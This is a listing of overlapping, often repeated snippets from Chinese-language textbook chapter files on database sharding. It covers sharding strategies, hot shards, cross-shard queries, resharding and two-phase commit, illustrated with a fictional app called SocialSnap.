  c12_b04.md: ...主要策略，各有 tradeoff（权衡）。  **基于范围的分片（range-based sharding）** 根据 shard key 列的值范围分配数据。例如：user ID 1–1,000,000 到 Shard 1；user ID 1,00...
  c12_b04.md: ...sharding）** 根据 shard key 列的值范围分配数据。例如：user ID 1–1,000,000 到 Shard 1；user ID 1,000,001–2,000,000 到 Shard 2；依此类推。这简单直观，也支持高效的范围...
  c12_b04.md: ...user ID 1–1,000,000 到 Shard 1；user ID 1,000,001–2,000,000 到 Shard 2；依此类推。这简单直观，也支持高效的范围查询（查找 user ID 在 500,000 到 600,000 之间的所...
  c12_b04.md: ...单直观，也支持高效的范围查询（查找 user ID 在 500,000 到 600,000 之间的所有用户——显然全在 Shard 1）。  基于范围分片的问题是**热 shard**。如果 user ID 顺序分配且不断有新用户，新用户总是去最高...
  c12_b04.md: ...在 500,000 到 600,000 之间的所有用户——显然全在 Shard 1）。  基于范围分片的问题是**热 shard**。如果 user ID 顺序分配且不断有新用户，新用户总是去最高 shard。所有注册写都命中 Shard N，而...
  c12_b04.md: ...1）。  基于范围分片的问题是**热 shard**。如果 user ID 顺序分配且不断有新用户，新用户总是去最高 shard。所有注册写都命中 Shard N，而 Shard 1 到 N-1 几乎空闲。负载分布不均——一个 shard 热（过载...
  c12_b04.md: ...是**热 shard**。如果 user ID 顺序分配且不断有新用户，新用户总是去最高 shard。所有注册写都命中 Shard N，而 Shard 1 到 N-1 几乎空闲。负载分布不均——一个 shard 热（过载），其他 shard 冷（利用...
  c12_b04.md: ...**。如果 user ID 顺序分配且不断有新用户，新用户总是去最高 shard。所有注册写都命中 Shard N，而 Shard 1 到 N-1 几乎空闲。负载分布不均——一个 shard 热（过载），其他 shard 冷（利用不足）。  **基于...
  c12_b04.md: ...是去最高 shard。所有注册写都命中 Shard N，而 Shard 1 到 N-1 几乎空闲。负载分布不均——一个 shard 热（过载），其他 shard 冷（利用不足）。  **基于哈希的分片（hash-based sharding）** 对...
  c12_b04.md: ...写都命中 Shard N，而 Shard 1 到 N-1 几乎空闲。负载分布不均——一个 shard 热（过载），其他 shard 冷（利用不足）。  **基于哈希的分片（hash-based sharding）** 对 shard key 应用哈希...
  c12_b04.md: ...热（过载），其他 shard 冷（利用不足）。  **基于哈希的分片（hash-based sharding）** 对 shard key 应用哈希函数，用结果决定 shard。例如，`shard_number = hash(user_id) % n...
  c12_b04.md: ...**基于哈希的分片（hash-based sharding）** 对 shard key 应用哈希函数，用结果决定 shard。例如，`shard_number = hash(user_id) % num_shards`。8 个 shard 且哈...
  c12_b04.md: ...决定 shard。例如，`shard_number = hash(user_id) % num_shards`。8 个 shard 且哈希函数好时，user ID 大致均匀分布到所有 8 个 shard。没有热 shard（假设没有热用户——见下文）...
  c12_b04.md: ...r_id) % num_shards`。8 个 shard 且哈希函数好时，user ID 大致均匀分布到所有 8 个 shard。没有热 shard（假设没有热用户——见下文）。  基于哈希分片的问题是范围查询变贵。想找上周注册的所有用户？如果用户...
  c12_b04.md: ...m_shards`。8 个 shard 且哈希函数好时，user ID 大致均匀分布到所有 8 个 shard。没有热 shard（假设没有热用户——见下文）。  基于哈希分片的问题是范围查询变贵。想找上周注册的所有用户？如果用户按 user ID...
  c12_b04.md: ...。  基于哈希分片的问题是范围查询变贵。想找上周注册的所有用户？如果用户按 user ID 哈希分片，这些人分布在所有 shard——你必须查询所有 shard 并合并结果。  **基于目录的分片（directory-based sharding）*...
  c12_b04.md: ...查询变贵。想找上周注册的所有用户？如果用户按 user ID 哈希分片，这些人分布在所有 shard——你必须查询所有 shard 并合并结果。  **基于目录的分片（directory-based sharding）** 维护一个独立的查找表（目录...
  c12_b04.md: ...。  **基于目录的分片（directory-based sharding）** 维护一个独立的查找表（目录），把每个 shard key 映射到它的 shard。想找 user 12345？在目录里查 12345：它说“Shard 4”。这是最灵活...
  c12_b04.md: ...ectory-based sharding）** 维护一个独立的查找表（目录），把每个 shard key 映射到它的 shard。想找 user 12345？在目录里查 12345：它说“Shard 4”。这是最灵活的策略——你可以把个别 key...
  c12_b04.md: ...（目录），把每个 shard key 映射到它的 shard。想找 user 12345？在目录里查 12345：它说“Shard 4”。这是最灵活的策略——你可以把个别 key 重新映射到不同 shard，而不必遵循公式。  目录分片的成本是目录本...
  c12_b04.md: ...12345？在目录里查 12345：它说“Shard 4”。这是最灵活的策略——你可以把个别 key 重新映射到不同 shard，而不必遵循公式。  目录分片的成本是目录本身。目录查找给每次操作增加延迟，目录成为单点故障（它必须高可用）。对非常大的...
  c12_b04.md: ...定义：分片  **分片**是把数据库数据划分成互不相交的子集（shards），每个子集存在独立数据库实例上的做法。每个 shard 包含一部分数据，所有 shard 合起来构成完整数据集。写被路由到拥有相关数据的 shard；读被路由到包含所请求数据...
  c12_b04.md: ...库数据划分成互不相交的子集（shards），每个子集存在独立数据库实例上的做法。每个 shard 包含一部分数据，所有 shard 合起来构成完整数据集。写被路由到拥有相关数据的 shard；读被路由到包含所请求数据的一个或多个 shard。  pl...
  c12_b04.md: ...数据库实例上的做法。每个 shard 包含一部分数据，所有 shard 合起来构成完整数据集。写被路由到拥有相关数据的 shard；读被路由到包含所请求数据的一个或多个 shard。  plain 语言：不是一家图书馆藏所有书，而是十家图书馆，每家藏...
  c12_b04.md: ...据，所有 shard 合起来构成完整数据集。写被路由到拥有相关数据的 shard；读被路由到包含所请求数据的一个或多个 shard。  plain 语言：不是一家图书馆藏所有书，而是十家图书馆，每家藏十分之一的书。请求被路由到持有相关书的那家。  每...
  c12_b04.md: ...plain 语言：不是一家图书馆藏所有书，而是十家图书馆，每家藏十分之一的书。请求被路由到持有相关书的那家。  每个 shard 通常是完全独立的数据库实例，常常有自己的读副本。这意味着读副本和分片策略可以组合：每个 shard 有一个主库和副本，...
  c12_b04.md: ...书的那家。  每个 shard 通常是完全独立的数据库实例，常常有自己的读副本。这意味着读副本和分片策略可以组合：每个 shard 有一个主库和副本，同时获得水平写扩展（分片）和水平读扩展（副本）。   #### 分片策略  如何决定哪些数据去哪个...
  c12_b04.md: ...有一个主库和副本，同时获得水平写扩展（分片）和水平读扩展（副本）。   #### 分片策略  如何决定哪些数据去哪个 shard？有三种主要策略，各有 tradeoff（权衡）。  **基于范围的分片（range-based sharding）**...
  c12_b04.md: ...主要策略，各有 tradeoff（权衡）。  **基于范围的分片（range-based sharding）** 根据 shard key 列的值范围分配数据。例如：user ID 1–1,000,000 到 Shard 1；user ID 1,00...
  c12_b04.md: ...sharding）** 根据 shard key 列的值范围分配数据。例如：user ID 1–1,000,000 到 Shard 1；user ID 1,000,001–2,000,000 到 Shard 2；依此类推。这简单直观，也支持高效的范围...
  c12_b04.md: ...user ID 1–1,000,000 到 Shard 1；user ID 1,000,001–2,000,000 到 Shard 2；依此类推。这简单直观，也支持高效的范围查询（查找 user ID 在 500,000 到 600,000 之间的所...
  c12_b04.md: ...单直观，也支持高效的范围查询（查找 user ID 在 500,000 到 600,000 之间的所有用户——显然全在 Shard 1）。  基于范围分片的问题是**热 shard**。如果 user ID 顺序分配且不断有新用户，新用户总是去最高...
  c12_b04.md: ...在 500,000 到 600,000 之间的所有用户——显然全在 Shard 1）。  基于范围分片的问题是**热 shard**。如果 user ID 顺序分配且不断有新用户，新用户总是去最高 shard。所有注册写都命中 Shard N，而...
  c12_b04.md: ...1）。  基于范围分片的问题是**热 shard**。如果 user ID 顺序分配且不断有新用户，新用户总是去最高 shard。所有注册写都命中 Shard N，而 Shard 1 到 N-1 几乎空闲。负载分布不均——一个 shard 热（过载...
  c12_b04.md: ...是**热 shard**。如果 user ID 顺序分配且不断有新用户，新用户总是去最高 shard。所有注册写都命中 Shard N，而 Shard 1 到 N-1 几乎空闲。负载分布不均——一个 shard 热（过载），其他 shard 冷（利用...
  c12_b04.md: ...**。如果 user ID 顺序分配且不断有新用户，新用户总是去最高 shard。所有注册写都命中 Shard N，而 Shard 1 到 N-1 几乎空闲。负载分布不均——一个 shard 热（过载），其他 shard 冷（利用不足）。  **基于...
  c12_b04.md: ...是去最高 shard。所有注册写都命中 Shard N，而 Shard 1 到 N-1 几乎空闲。负载分布不均——一个 shard 热（过载），其他 shard 冷（利用不足）。  **基于哈希的分片（hash-based sharding）** 对...
  c12_b04.md: ...写都命中 Shard N，而 Shard 1 到 N-1 几乎空闲。负载分布不均——一个 shard 热（过载），其他 shard 冷（利用不足）。  **基于哈希的分片（hash-based sharding）** 对 shard key 应用哈希...
  c12_b04.md: ...热（过载），其他 shard 冷（利用不足）。  **基于哈希的分片（hash-based sharding）** 对 shard key 应用哈希函数，用结果决定 shard。例如，`shard_number = hash(user_id) % n...
  c12_b04.md: ...**基于哈希的分片（hash-based sharding）** 对 shard key 应用哈希函数，用结果决定 shard。例如，`shard_number = hash(user_id) % num_shards`。8 个 shard 且哈...
  c12_b04.md: ...决定 shard。例如，`shard_number = hash(user_id) % num_shards`。8 个 shard 且哈希函数好时，user ID 大致均匀分布到所有 8 个 shard。没有热 shard（假设没有热用户——见下文）...
  c12_b04.md: ...r_id) % num_shards`。8 个 shard 且哈希函数好时，user ID 大致均匀分布到所有 8 个 shard。没有热 shard（假设没有热用户——见下文）。  基于哈希分片的问题是范围查询变贵。想找上周注册的所有用户？如果用户...
  c12_b04.md: ...m_shards`。8 个 shard 且哈希函数好时，user ID 大致均匀分布到所有 8 个 shard。没有热 shard（假设没有热用户——见下文）。  基于哈希分片的问题是范围查询变贵。想找上周注册的所有用户？如果用户按 user ID...
  c12_b04.md: ...。  基于哈希分片的问题是范围查询变贵。想找上周注册的所有用户？如果用户按 user ID 哈希分片，这些人分布在所有 shard——你必须查询所有 shard 并合并结果。  **基于目录的分片（directory-based sharding）*...
  c12_b04.md: ...查询变贵。想找上周注册的所有用户？如果用户按 user ID 哈希分片，这些人分布在所有 shard——你必须查询所有 shard 并合并结果。  **基于目录的分片（directory-based sharding）** 维护一个独立的查找表（目录...
  c12_b04.md: ...。  **基于目录的分片（directory-based sharding）** 维护一个独立的查找表（目录），把每个 shard key 映射到它的 shard。想找 user 12345？在目录里查 12345：它说“Shard 4”。这是最灵活...
  c12_b04.md: ...ectory-based sharding）** 维护一个独立的查找表（目录），把每个 shard key 映射到它的 shard。想找 user 12345？在目录里查 12345：它说“Shard 4”。这是最灵活的策略——你可以把个别 key...
  c12_b04.md: ...（目录），把每个 shard key 映射到它的 shard。想找 user 12345？在目录里查 12345：它说“Shard 4”。这是最灵活的策略——你可以把个别 key 重新映射到不同 shard，而不必遵循公式。  目录分片的成本是目录本...
  c12_b04.md: ...12345？在目录里查 12345：它说“Shard 4”。这是最灵活的策略——你可以把个别 key 重新映射到不同 shard，而不必遵循公式。  目录分片的成本是目录本身。目录查找给每次操作增加延迟，目录成为单点故障（它必须高可用）。对非常大的...
  c12_b05.md: ...#### 热 shard 问题  即使基于哈希分片，特定模式也会造成热 shard：**热 key**。想象 SocialSnap 有一位名人用...
  c12_b05.md: ...#### 热 shard 问题  即使基于哈希分片，特定模式也会造成热 shard：**热 key**。想象 SocialSnap 有一位名人用户——叫她 @nova——有 2000 万（20 mill...
  c12_b05.md: ...ion）粉丝。每次 @nova 发帖，都会触发 2000 万条 feed 更新。所有 @nova 的数据哈希后落到比如 Shard 3。Shard 3 被一个用户相关的操作洪流淹没。  shard 热不是因为多数人分布不均，而是因为少数人的极端集中。...
  c12_b05.md: ...次 @nova 发帖，都会触发 2000 万条 feed 更新。所有 @nova 的数据哈希后落到比如 Shard 3。Shard 3 被一个用户相关的操作洪流淹没。  shard 热不是因为多数人分布不均，而是因为少数人的极端集中。  处理热 sh...
  c12_b05.md: ...eed 更新。所有 @nova 的数据哈希后落到比如 Shard 3。Shard 3 被一个用户相关的操作洪流淹没。  shard 热不是因为多数人分布不均，而是因为少数人的极端集中。  处理热 shard 需要对热 key 特殊处理：更激进地复制热...
  c12_b05.md: ...rd 3 被一个用户相关的操作洪流淹没。  shard 热不是因为多数人分布不均，而是因为少数人的极端集中。  处理热 shard 需要对热 key 特殊处理：更激进地复制热 key 的数据、从缓存服务（如 SocialSnap 第 7 章已做的 R...
  c12_b05.md: ...key 的数据、从缓存服务（如 SocialSnap 第 7 章已做的 Redis），或在应用层把热 key 跨多个 shard 拆分。这些都不简单。   #### SocialSnap v5——按 user_id 分片  SocialSnap 团...
  c12_b05.md: ...SocialSnap 团队决定对 `users` 和 `posts` 表按 `user_id` 做哈希分片，共 8 个 shard。user ID 对 8 取模决定用户的资料存在哪个数据库实例。  应用代码更新：涉及用户的每个数据库操作先计算 `sh...
  c12_b05.md: ...rd_number = hash(user_id) % 8`，然后把查询路由到对应数据库实例。  写延迟大幅改善。每个 shard 处理八分之一的写负载。8 个 shard 下，每个主库现在大约处理每秒 625 次写入—— comfortably 在...
  c12_b05.md: ..._id) % 8`，然后把查询路由到对应数据库实例。  写延迟大幅改善。每个 shard 处理八分之一的写负载。8 个 shard 下，每个主库现在大约处理每秒 625 次写入—— comfortably 在舒适范围内。  但部署几小时内，新问题出现...
  c12_b05.md: ...条帖子”。这个查询需要找到所有用户中点赞最多的帖子。但用户按 `user_id` 分片。user 1234 的帖子在 Shard 1；user 5678 的帖子在 Shard 3。“全球最受欢迎的帖子”需要来自全部 8 个 shard 的数据。...
  c12_b05.md: ...的帖子。但用户按 `user_id` 分片。user 1234 的帖子在 Shard 1；user 5678 的帖子在 Shard 3。“全球最受欢迎的帖子”需要来自全部 8 个 shard 的数据。  分片前简单至极的查询：       SELEC...
  c12_b05.md: ...4 的帖子在 Shard 1；user 5678 的帖子在 Shard 3。“全球最受欢迎的帖子”需要来自全部 8 个 shard 的数据。  分片前简单至极的查询：       SELECT post_id, like_count     FROM...
  c12_b05.md: ...s     ORDER BY like_count DESC     LIMIT 10;   现在需要查询全部 8 个 shard，从每个 shard 取前 10，再在应用层合并结果找出真正全球前 10。应用必须编排 8 个并行查询并自己执行合并逻辑...
  c12_b05.md: ...R BY like_count DESC     LIMIT 10;   现在需要查询全部 8 个 shard，从每个 shard 取前 10，再在应用层合并结果找出真正全球前 10。应用必须编排 8 个并行查询并自己执行合并逻辑，因为没有一个数据库...
  c12_b05.md: ...0，再在应用层合并结果找出真正全球前 10。应用必须编排 8 个并行查询并自己执行合并逻辑，因为没有一个数据库知道其他 shard 的情况。  这就是**跨分片查询问题（cross-shard query problem）**，也是分片最显著的成本之...
  c12_b05.md: ...个并行查询并自己执行合并逻辑，因为没有一个数据库知道其他 shard 的情况。  这就是**跨分片查询问题（cross-shard query problem）**，也是分片最显著的成本之一。  分片前是 O(1) 查找的简单查询，分片后变成 O(s...
  c12_b05.md: ...出 user 1234 的所有朋友。”`friendships` 表可能存 user ID 对。User 1234 在 Shard 1，但 1234 的朋友可能在任何 shard。分片前有效的简单 JOIN，现在需要先查询 Shard 1 拿到朋友...
  c12_b05.md: ...ndships` 表可能存 user ID 对。User 1234 在 Shard 1，但 1234 的朋友可能在任何 shard。分片前有效的简单 JOIN，现在需要先查询 Shard 1 拿到朋友 user ID 列表，再扇出到所有 shard...
  c12_b05.md: ...1234 在 Shard 1，但 1234 的朋友可能在任何 shard。分片前有效的简单 JOIN，现在需要先查询 Shard 1 拿到朋友 user ID 列表，再扇出到所有 shard 查找每个朋友的资料。  跨分片查询问题不仅是性能问题——...
  c12_b05.md: ...shard。分片前有效的简单 JOIN，现在需要先查询 Shard 1 拿到朋友 user ID 列表，再扇出到所有 shard 查找每个朋友的资料。  跨分片查询问题不仅是性能问题——更是设计约束。它迫使团队仔细考虑需要什么查询，并据此设计分片策...
  c12_b05.md: ...能问题——更是设计约束。它迫使团队仔细考虑需要什么查询，并据此设计分片策略。一个能消除大多数跨分片查询的常见访问模式的 shard key，值得在其他地方付出显著 tradeoff（权衡）。...
  c12_b05.md: ...#### 热 shard 问题  即使基于哈希分片，特定模式也会造成热 shard：**热 key**。想象 SocialSnap 有一位名人用...
  c12_b05.md: ...#### 热 shard 问题  即使基于哈希分片，特定模式也会造成热 shard：**热 key**。想象 SocialSnap 有一位名人用户——叫她 @nova——有 2000 万（20 mill...
  c12_b05.md: ...ion）粉丝。每次 @nova 发帖，都会触发 2000 万条 feed 更新。所有 @nova 的数据哈希后落到比如 Shard 3。Shard 3 被一个用户相关的操作洪流淹没。  shard 热不是因为多数人分布不均，而是因为少数人的极端集中。...
  c12_b05.md: ...次 @nova 发帖，都会触发 2000 万条 feed 更新。所有 @nova 的数据哈希后落到比如 Shard 3。Shard 3 被一个用户相关的操作洪流淹没。  shard 热不是因为多数人分布不均，而是因为少数人的极端集中。  处理热 sh...
  c12_b05.md: ...eed 更新。所有 @nova 的数据哈希后落到比如 Shard 3。Shard 3 被一个用户相关的操作洪流淹没。  shard 热不是因为多数人分布不均，而是因为少数人的极端集中。  处理热 shard 需要对热 key 特殊处理：更激进地复制热...
  c12_b05.md: ...rd 3 被一个用户相关的操作洪流淹没。  shard 热不是因为多数人分布不均，而是因为少数人的极端集中。  处理热 shard 需要对热 key 特殊处理：更激进地复制热 key 的数据、从缓存服务（如 SocialSnap 第 7 章已做的 R...
  c12_b05.md: ...key 的数据、从缓存服务（如 SocialSnap 第 7 章已做的 Redis），或在应用层把热 key 跨多个 shard 拆分。这些都不简单。   #### SocialSnap v5——按 user_id 分片  SocialSnap 团...
  c12_b05.md: ...SocialSnap 团队决定对 `users` 和 `posts` 表按 `user_id` 做哈希分片，共 8 个 shard。user ID 对 8 取模决定用户的资料存在哪个数据库实例。  应用代码更新：涉及用户的每个数据库操作先计算 `sh...
  c12_b05.md: ...rd_number = hash(user_id) % 8`，然后把查询路由到对应数据库实例。  写延迟大幅改善。每个 shard 处理八分之一的写负载。8 个 shard 下，每个主库现在大约处理每秒 625 次写入—— comfortably 在...
  c12_b05.md: ..._id) % 8`，然后把查询路由到对应数据库实例。  写延迟大幅改善。每个 shard 处理八分之一的写负载。8 个 shard 下，每个主库现在大约处理每秒 625 次写入—— comfortably 在舒适范围内。  但部署几小时内，新问题出现...
  c12_b05.md: ...条帖子”。这个查询需要找到所有用户中点赞最多的帖子。但用户按 `user_id` 分片。user 1234 的帖子在 Shard 1；user 5678 的帖子在 Shard 3。“全球最受欢迎的帖子”需要来自全部 8 个 shard 的数据。...
  c12_b05.md: ...的帖子。但用户按 `user_id` 分片。user 1234 的帖子在 Shard 1；user 5678 的帖子在 Shard 3。“全球最受欢迎的帖子”需要来自全部 8 个 shard 的数据。  分片前简单至极的查询：       SELEC...
  c12_b05.md: ...4 的帖子在 Shard 1；user 5678 的帖子在 Shard 3。“全球最受欢迎的帖子”需要来自全部 8 个 shard 的数据。  分片前简单至极的查询：       SELECT post_id, like_count     FROM...
  c12_b05.md: ...s     ORDER BY like_count DESC     LIMIT 10;   现在需要查询全部 8 个 shard，从每个 shard 取前 10，再在应用层合并结果找出真正全球前 10。应用必须编排 8 个并行查询并自己执行合并逻辑...
  c12_b05.md: ...R BY like_count DESC     LIMIT 10;   现在需要查询全部 8 个 shard，从每个 shard 取前 10，再在应用层合并结果找出真正全球前 10。应用必须编排 8 个并行查询并自己执行合并逻辑，因为没有一个数据库...
  c12_b05.md: ...0，再在应用层合并结果找出真正全球前 10。应用必须编排 8 个并行查询并自己执行合并逻辑，因为没有一个数据库知道其他 shard 的情况。  这就是**跨分片查询问题（cross-shard query problem）**，也是分片最显著的成本之...
  c12_b05.md: ...个并行查询并自己执行合并逻辑，因为没有一个数据库知道其他 shard 的情况。  这就是**跨分片查询问题（cross-shard query problem）**，也是分片最显著的成本之一。  分片前是 O(1) 查找的简单查询，分片后变成 O(s...
  c12_b05.md: ...出 user 1234 的所有朋友。”`friendships` 表可能存 user ID 对。User 1234 在 Shard 1，但 1234 的朋友可能在任何 shard。分片前有效的简单 JOIN，现在需要先查询 Shard 1 拿到朋友...
  c12_b05.md: ...ndships` 表可能存 user ID 对。User 1234 在 Shard 1，但 1234 的朋友可能在任何 shard。分片前有效的简单 JOIN，现在需要先查询 Shard 1 拿到朋友 user ID 列表，再扇出到所有 shard...
  c12_b05.md: ...1234 在 Shard 1，但 1234 的朋友可能在任何 shard。分片前有效的简单 JOIN，现在需要先查询 Shard 1 拿到朋友 user ID 列表，再扇出到所有 shard 查找每个朋友的资料。  跨分片查询问题不仅是性能问题——...
  c12_b05.md: ...shard。分片前有效的简单 JOIN，现在需要先查询 Shard 1 拿到朋友 user ID 列表，再扇出到所有 shard 查找每个朋友的资料。  跨分片查询问题不仅是性能问题——更是设计约束。它迫使团队仔细考虑需要什么查询，并据此设计分片策...
  c12_b05.md: ...能问题——更是设计约束。它迫使团队仔细考虑需要什么查询，并据此设计分片策略。一个能消除大多数跨分片查询的常见访问模式的 shard key，值得在其他地方付出显著 tradeoff（权衡）。...
  c12_b06.md: ...### 12.5 重分片的成本  假设 SocialSnap 从 8 个 shard 开始并继续增长。最终 8 个 shard 不够，团队需要 16 个。这需要**重分片（resharding）**：把现...
  c12_b06.md: ...### 12.5 重分片的成本  假设 SocialSnap 从 8 个 shard 开始并继续增长。最终 8 个 shard 不够，团队需要 16 个。这需要**重分片（resharding）**：把现有 8 个 shard 的数据重新分布到新...
  c12_b06.md: ...增长。最终 8 个 shard 不够，团队需要 16 个。这需要**重分片（resharding）**：把现有 8 个 shard 的数据重新分布到新的 16 个 shard。  用 `user_id % 8` 的哈希分片，数据分布是：user 1...
  c12_b06.md: ...要 16 个。这需要**重分片（resharding）**：把现有 8 个 shard 的数据重新分布到新的 16 个 shard。  用 `user_id % 8` 的哈希分片，数据分布是：user 1 → Shard 1，user 2 → Sha...
  c12_b06.md: ...数据重新分布到新的 16 个 shard。  用 `user_id % 8` 的哈希分片，数据分布是：user 1 → Shard 1，user 2 → Shard 2，...，user 8 → Shard 0，user 9 → Shard 1，依此...
  c12_b06.md: ...ard。  用 `user_id % 8` 的哈希分片，数据分布是：user 1 → Shard 1，user 2 → Shard 2，...，user 8 → Shard 0，user 9 → Shard 1，依此类推。用 `user_id % 1...
  c12_b06.md: ...的哈希分片，数据分布是：user 1 → Shard 1，user 2 → Shard 2，...，user 8 → Shard 0，user 9 → Shard 1，依此类推。用 `user_id % 16`，映射完全改变。几乎每条记录都需要移动...
  c12_b06.md: ...1 → Shard 1，user 2 → Shard 2，...，user 8 → Shard 0，user 9 → Shard 1，依此类推。用 `user_id % 16`，映射完全改变。几乎每条记录都需要移动。  8 个 shard 共 50...
  c12_b06.md: ...9 → Shard 1，依此类推。用 `user_id % 16`，映射完全改变。几乎每条记录都需要移动。  8 个 shard 共 500 GB 数据，重分片意味着在系统仍然在线的情况下复制和校验约 500 GB 数据。这有风险——迁移期间查询要...
  c12_b06.md: ...么重分片常被畏惧和拖延。一种降低重分片成本的常见策略是**一致性哈希（consistent hashing）**，它在 shard 增加时最小化数据移动。但即使一致性哈希也无法完全消除迁移。  重分片的高成本是团队常常早期过度配置 shard 的原因...
  c12_b06.md: ...，它在 shard 增加时最小化数据移动。但即使一致性哈希也无法完全消除迁移。  重分片的高成本是团队常常早期过度配置 shard 的原因之一：今天需要 8 个 shard 时却从 64 个开始，意味着可能永远不需要重分片。代价是更多复杂度和更多数据...
  c12_b06.md: ...但即使一致性哈希也无法完全消除迁移。  重分片的高成本是团队常常早期过度配置 shard 的原因之一：今天需要 8 个 shard 时却从 64 个开始，意味着可能永远不需要重分片。代价是更多复杂度和更多数据库实例要管理，但可能避免未来灾难性的迁移。...
  c12_b06.md: ...起来。数据库引擎在单台机器上能高效执行这些 JOIN。  按 `user_id` 分片后，`users` 表在 8 个 shard，`posts` 表也在 8 个 shard。它们之间的 JOIN 现在变成跨 shard 操作。  应对这个问题的一种...
  c12_b06.md: ...JOIN。  按 `user_id` 分片后，`users` 表在 8 个 shard，`posts` 表也在 8 个 shard。它们之间的 JOIN 现在变成跨 shard 操作。  应对这个问题的一种方法是**反规范化（denormalizat...
  c12_b06.md: ...`users` 表在 8 个 shard，`posts` 表也在 8 个 shard。它们之间的 JOIN 现在变成跨 shard 操作。  应对这个问题的一种方法是**反规范化（denormalization）**：故意复制数据以避免 JOIN。...
  c12_b06.md: ...### 12.5 重分片的成本  假设 SocialSnap 从 8 个 shard 开始并继续增长。最终 8 个 shard 不够，团队需要 16 个。这需要**重分片（resharding）**：把现...
  c12_b06.md: ...### 12.5 重分片的成本  假设 SocialSnap 从 8 个 shard 开始并继续增长。最终 8 个 shard 不够，团队需要 16 个。这需要**重分片（resharding）**：把现有 8 个 shard 的数据重新分布到新...
  c12_b06.md: ...增长。最终 8 个 shard 不够，团队需要 16 个。这需要**重分片（resharding）**：把现有 8 个 shard 的数据重新分布到新的 16 个 shard。  用 `user_id % 8` 的哈希分片，数据分布是：user 1...
  c12_b06.md: ...要 16 个。这需要**重分片（resharding）**：把现有 8 个 shard 的数据重新分布到新的 16 个 shard。  用 `user_id % 8` 的哈希分片，数据分布是：user 1 → Shard 1，user 2 → Sha...
  c12_b06.md: ...数据重新分布到新的 16 个 shard。  用 `user_id % 8` 的哈希分片，数据分布是：user 1 → Shard 1，user 2 → Shard 2，...，user 8 → Shard 0，user 9 → Shard 1，依此...
  c12_b06.md: ...ard。  用 `user_id % 8` 的哈希分片，数据分布是：user 1 → Shard 1，user 2 → Shard 2，...，user 8 → Shard 0，user 9 → Shard 1，依此类推。用 `user_id % 1...
  c12_b06.md: ...的哈希分片，数据分布是：user 1 → Shard 1，user 2 → Shard 2，...，user 8 → Shard 0，user 9 → Shard 1，依此类推。用 `user_id % 16`，映射完全改变。几乎每条记录都需要移动...
  c12_b06.md: ...1 → Shard 1，user 2 → Shard 2，...，user 8 → Shard 0，user 9 → Shard 1，依此类推。用 `user_id % 16`，映射完全改变。几乎每条记录都需要移动。  8 个 shard 共 50...
  c12_b06.md: ...9 → Shard 1，依此类推。用 `user_id % 16`，映射完全改变。几乎每条记录都需要移动。  8 个 shard 共 500 GB 数据，重分片意味着在系统仍然在线的情况下复制和校验约 500 GB 数据。这有风险——迁移期间查询要...
  c12_b06.md: ...么重分片常被畏惧和拖延。一种降低重分片成本的常见策略是**一致性哈希（consistent hashing）**，它在 shard 增加时最小化数据移动。但即使一致性哈希也无法完全消除迁移。  重分片的高成本是团队常常早期过度配置 shard 的原因...
  c12_b06.md: ...，它在 shard 增加时最小化数据移动。但即使一致性哈希也无法完全消除迁移。  重分片的高成本是团队常常早期过度配置 shard 的原因之一：今天需要 8 个 shard 时却从 64 个开始，意味着可能永远不需要重分片。代价是更多复杂度和更多数据...
  c12_b06.md: ...但即使一致性哈希也无法完全消除迁移。  重分片的高成本是团队常常早期过度配置 shard 的原因之一：今天需要 8 个 shard 时却从 64 个开始，意味着可能永远不需要重分片。代价是更多复杂度和更多数据库实例要管理，但可能避免未来灾难性的迁移。...
  c12_b06.md: ...起来。数据库引擎在单台机器上能高效执行这些 JOIN。  按 `user_id` 分片后，`users` 表在 8 个 shard，`posts` 表也在 8 个 shard。它们之间的 JOIN 现在变成跨 shard 操作。  应对这个问题的一种...
  c12_b06.md: ...JOIN。  按 `user_id` 分片后，`users` 表在 8 个 shard，`posts` 表也在 8 个 shard。它们之间的 JOIN 现在变成跨 shard 操作。  应对这个问题的一种方法是**反规范化（denormalizat...
  c12_b06.md: ...`users` 表在 8 个 shard，`posts` 表也在 8 个 shard。它们之间的 JOIN 现在变成跨 shard 操作。  应对这个问题的一种方法是**反规范化（denormalization）**：故意复制数据以避免 JOIN。...
  c12_b07.md: ...滚——支付记录消失，用户仍是非高级。数据库保证原子性。  分片后，`payments` 和 `users` 可能在不同 shard（如果按不同 key 分片），也可能在同一 shard（如果都按 `user_id` 分片）。SocialSnap 的情...
  c12_b07.md: ...分片后，`payments` 和 `users` 可能在不同 shard（如果按不同 key 分片），也可能在同一 shard（如果都按 `user_id` 分片）。SocialSnap 的情况中，两张表都按 `user_id` 分片，因此同一用...
  c12_b07.md: ...er_id` 分片）。SocialSnap 的情况中，两张表都按 `user_id` 分片，因此同一用户的数据落在同一 shard——这个特定问题被避免了。  但考虑转账操作：用户 Alice（Shard 1）给用户 Bob（Shard 3）送礼。扣...
  c12_b07.md: ...余额，增加 Bob 余额。这些更新必须原子——不能扣了 Alice 却没加到 Bob，让钱消失在虚空中。Alice 在 Shard 1、Bob 在 Shard 3，这就是**分布式事务（distributed transaction）**。   ##...
  c12_b07.md: ...些更新必须原子——不能扣了 Alice 却没加到 Bob，让钱消失在虚空中。Alice 在 Shard 1、Bob 在 Shard 3，这就是**分布式事务（distributed transaction）**。   #### 定义：分布式事务  *...
  c12_b07.md: ...C）**。一个**协调器（coordinator）**编排事务：  1. **第一阶段（准备）：** 协调器向每个参与 shard 发送“准备”消息。每个 shard 把拟议变更写到临时区域，并承诺（投“yes”）可以提交。如果任何 shard 不能...
  c12_b07.md: ...inator）**编排事务：  1. **第一阶段（准备）：** 协调器向每个参与 shard 发送“准备”消息。每个 shard 把拟议变更写到临时区域，并承诺（投“yes”）可以提交。如果任何 shard 不能提交（如约束冲突或故障），它投“no...
  c12_b07.md: ...参与 shard 发送“准备”消息。每个 shard 把拟议变更写到临时区域，并承诺（投“yes”）可以提交。如果任何 shard 不能提交（如约束冲突或故障），它投“no”。  2. **第二阶段（提交）：** 如果所有 shard 都投“yes”...
  c12_b07.md: ...提交。如果任何 shard 不能提交（如约束冲突或故障），它投“no”。  2. **第二阶段（提交）：** 如果所有 shard 都投“yes”，协调器发送“提交”。每个 shard 应用已准备的变更并释放锁。如果任何 shard 投“no”，协调...
  c12_b07.md: ...），它投“no”。  2. **第二阶段（提交）：** 如果所有 shard 都投“yes”，协调器发送“提交”。每个 shard 应用已准备的变更并释放锁。如果任何 shard 投“no”，协调器向所有 shard 发送“中止”，它们丢弃已准备的变...
